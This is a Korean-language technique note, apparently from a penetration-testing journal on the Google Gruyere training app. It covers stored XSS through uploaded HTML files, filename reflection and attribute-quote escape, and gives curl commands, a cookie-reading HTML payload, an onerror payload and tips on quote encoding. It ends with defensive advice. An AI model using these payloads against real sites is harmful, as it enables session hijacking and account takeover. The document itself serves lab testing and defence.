# Stored XSS — 저장 지점이 "화면"이 아니라 "파일"인 경우 (업로드 기반 전달)

## 원리

저장형 XSS 는 보통 게시글·댓글 같은 **데이터 저장 지점**을 통해 들어간다. 그런데 파일 업로드
기능이 아래 조건을 만족하면, 업로드가 그대로 XSS **배포 지점**이 된다.

1. 업로드한 파일이 **같은 출처(same-origin)** 에서 서빙되고,
2. 서버가 확장자를 보고 **Content-type 을 그대로** 붙여주며(또는 브라우저가 스니핑),
3. 그 URL 을 피해자에게 전달할 수 있을 때.

이 경우 **경로이탈이나 정화기 우회가 전혀 필요 없다.** "허용된 기능을 정상적으로 사용"하는
것만으로 저장형 XSS 가 성립한다.

## 케이스 A — `.html`/`.htm`/`.js` 업로드가 그대로 서빙

```bash
cat > payload.html <<'EOF'
<html><body><script>
document.title='UPLOAD-XSS';
var d=document.createElement('div'); d.id='xss-proof';
d.textContent='COOKIE='+document.cookie; document.body.appendChild(d);
</script></body></html>
EOF
curl -s -b <session> -F 'upload_file=@payload.html;filename=payload.html' \
  "https://<target>/<base>/upload"
# 같은 출처에서 서빙되는지 확인
curl -s -o /dev/null -w "%{content_type}\n" \
  "https://<target>/<base>/<user>/payload.html"      # text/html → 브라우저가 실행
```
검증: 로그인한 브라우저로 그 URL 을 열고 `document.title` 과 주입 DOM(`#xss-proof`)을 확인한다.
쿠키가 HttpOnly 가 아니면 `document.cookie` 로 세션 쿠키가 노출된다(→ 세션 탈취).

## 케이스 B — 파일명 자체가 반사되는 경우 (self-XSS 로 강등해 판정)

업로드 결과 페이지가 파일명을 그대로 출력하면 반사형 XSS 도 가능하다. 다만 이건
**자기 자신에게만** 실행되는 self-XSS 인 경우가 많다 — 별도 근거 없이 저장형과 같은
심각도로 올리지 말 것.

```bash
curl -s -b <session> -F 'upload_file=@x.bin;filename=<img src=x onerror=alert(1)>.txt' \
  "https://<target>/<base>/upload"
```
주의: 브라우저 폼으로 보내면 브라우저가 `"` 를 `%22` 로 인코딩해 핸들러가 무력화될 수 있다
→ **따옴표 없는 페이로드**로 다시 시도해 본다. curl 로 보낼 때와 브라우저로 보낼 때의
인코딩 차이를 항상 의식한다.

## 케이스 C — 저장 지점이 "텍스트 필드"일 때: 속성 컨텍스트 탈출

화면에 렌더되는 텍스트 필드라도 템플릿에서 **속성값**으로 들어가면 이스케이프 요구가 다르다.

```text
<img alt='' src='{{icon:text}}'>        <!-- 값이 단일인용부호 속성 안에 들어간다 -->
```
`cgi.escape(quote=False)` 처럼 **따옴표를 이스케이프하지 않는** 함수가 쓰이면 값 안의 `'` 로
속성을 탈출해 이벤트 핸들러를 심을 수 있다.

```bash
curl -s -b <session> --get --data-urlencode "icon=x' onerror='<js>'" \
  "https://<target>/<base>/saveprofile?action=update&uid=<me>"
curl -s "https://<target>/<base>/" | grep -o "<img alt=''[^>]*>"   # 속성 탈출 확인
```
페이로드에 쓸 따옴표 종류는 **템플릿의 속성 따옴표와 반대**로 골라야 한다
(속성이 `'...'` 면 `"` 를 쓴다). 반대면 속성이 먼저 끊겨 실패한다.

## 판정·기록 요령

- 저장 지점이 파일이든 필드든, **비인증 세션**으로 렌더/실행을 확인해 피해 범위를 확정한다.
- 실행 증거는 스크린샷보다 **DOM 마커 + 반환값**(`document.title`, `#xss-proof` 내용)이
  명확하고 텍스트로 남길 수 있다.
- 여러 저장 지점(스니펫, 프로필, 업로드, 템플릿)이 있으면 **각각을 독립 경로로 기록**한다 —
  하나를 막아도 나머지가 남는다는 것이 방어 관점의 핵심 근거가 된다.

## 확인된 사례

- 재확인된 사례: `google-gruyere-trial` (Round 4 스니펫 필드 / Round 5 프로필 속성 탈출 /
  Round 10 업로드 파일 서빙 — 전부 **비인증 방문자** 브라우저에서 실행 확인, 세션 쿠키 탈취까지).

## 방어 관점 메모

- 업로드 디렉터리는 **다른 출처(별도 도메인/서브도메인)** 에서 서빙하거나, `Content-Disposition:
  attachment` + `X-Content-Type-Options: nosniff` 로 실행을 막는다.
- HTML 렌더 지점은 컨텍스트별 이스케이프(속성/URL/JS)를 적용하고, 템플릿에서 따옴표를
  이스케이프하지 않는 함수를 쓰지 않는다.
- 세션 쿠키에 HttpOnly·Secure·SameSite 를 설정해 XSS→세션 탈취 체인을 끊는다.

<!-- 출처: journal/web/google-gruyere-trial/, Round 4 / Round 5 / Round 6 / Round 10 -->
